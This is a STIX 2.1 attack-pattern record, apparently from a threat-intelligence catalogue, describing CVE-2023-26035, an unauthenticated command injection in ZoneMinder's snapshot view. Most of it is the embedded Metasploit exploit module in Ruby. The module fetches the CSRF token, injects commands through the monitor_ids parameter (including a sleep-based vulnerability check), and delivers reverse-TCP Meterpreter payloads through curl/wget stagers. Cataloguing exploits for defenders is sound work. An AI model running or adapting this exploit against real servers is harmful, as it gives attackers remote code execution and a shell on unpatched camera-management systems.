{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--310fe376-737e-4885-a9a7-72a8dde3aeb6",
    "created": "2024-08-14T17:12:09.662843Z",
    "modified": "2024-08-14T17:12:09.662848Z",
    "name": "ZoneMinder Snapshots Command Injection",
    "description": " This module exploits an unauthenticated command injection in zoneminder that can be exploited by appending a command to the \"create monitor ids[]\"-action of the snapshot view. Affected versions: < 1.36.33, < 1.37.33  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/zoneminder_snapshots.rb",
            "external_id": "zoneminder_snapshots.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-26035"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n#\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Exploit::Remote::AutoCheck\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ZoneMinder Snapshots Command Injection',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection\n          in zoneminder that can be exploited by appending a command\n          to the \"create monitor ids[]\"-action of the snapshot view.\n          Affected versions: < 1.36.33, < 1.37.33\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'UnblvR',    # Discovery\n          'whotwagner' # Metasploit Module\n        ],\n        'References' => [\n          [ 'CVE', '2023-26035' ],\n          [ 'URL', 'https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr']\n        ],\n        'Privileged' => false,\n        'Platform' => ['linux', 'unix'],\n        'Targets' => [\n          [\n            'nix Command',\n            {\n              'Platform' => ['unix', 'linux'],\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp',\n                'FETCH_WRITABLE_DIR' => '/tmp'\n              }\n            }\n          ],\n          [\n            'Linux (Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },\n              'Type' => :linux_dropper\n            }\n          ],\n        ],\n        'CmdStagerFlavor' => [ 'bourne', 'curl', 'wget', 'printf', 'echo' ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-02-24',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The ZoneMinder path', '/zm/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'GET'\n    )\n    return Exploit::CheckCode::Unknown('No response from the web service') if res.nil?\n    return Exploit::CheckCode::Safe(\"Check TARGETURI - unexpected HTTP response code: #{res.code}\") if res.code != 200\n\n    unless res.body.include?('ZoneMinder')\n      return Exploit::CheckCode::Safe('Target is not a ZoneMinder web server')\n    end\n\n    csrf_magic = get_csrf_magic(res)\n    # This check executes a sleep-command and checks the response-time\n    sleep_time = rand(5..10)\n    data = \"view=snapshot&action=create&monitor_ids[0][Id]=0;sleep #{sleep_time}\"\n    data += \"&__csrf_magic=#{csrf_magic}\" if csrf_magic\n    res, elapsed_time = Rex::Stopwatch.elapsed_time do\n      send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' => 'POST',\n        'data' => data.to_s,\n        'keep_cookies' => true\n      )\n    end\n    return Exploit::CheckCode::Unknown('Could not connect to the web service') unless res\n\n    print_status(\"Elapsed time: #{elapsed_time} seconds.\")\n    if sleep_time < elapsed_time\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe('Target is not vulnerable')\n  end\n\n  def execute_command(cmd, _opts = {})\n    command = Rex::Text.uri_encode(cmd)\n    print_status('Sending payload')\n    data = \"view=snapshot&action=create&monitor_ids[0][Id]=;#{command}\"\n    data += \"&__csrf_magic=#{@csrf_magic}\" if @csrf_magic\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'POST',\n      'data' => data.to_s\n    )\n    print_good('Payload sent')\n  end\n\n  def exploit\n    # get magic csrf-token\n    print_status('Fetching CSRF Token')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'GET'\n    )\n\n    if res && res.code == 200\n      # parse token\n      @csrf_magic = get_csrf_magic(res)\n      unless @csrf_magic =~ /^key:[a-f0-9]{40},\\d+/\n        fail_with(Failure::UnexpectedReply, 'Unable to parse token.')\n      end\n    else\n      fail_with(Failure::UnexpectedReply, 'Unable to fetch token.')\n    end\n    print_good(\"Got Token: #{@csrf_magic}\")\n    # send payload\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  private\n\n  def get_csrf_magic(res)\n    return if res.nil?\n\n    res.get_html_document.at('//input[@name=\"__csrf_magic\"]/@value')&.text\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-02-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}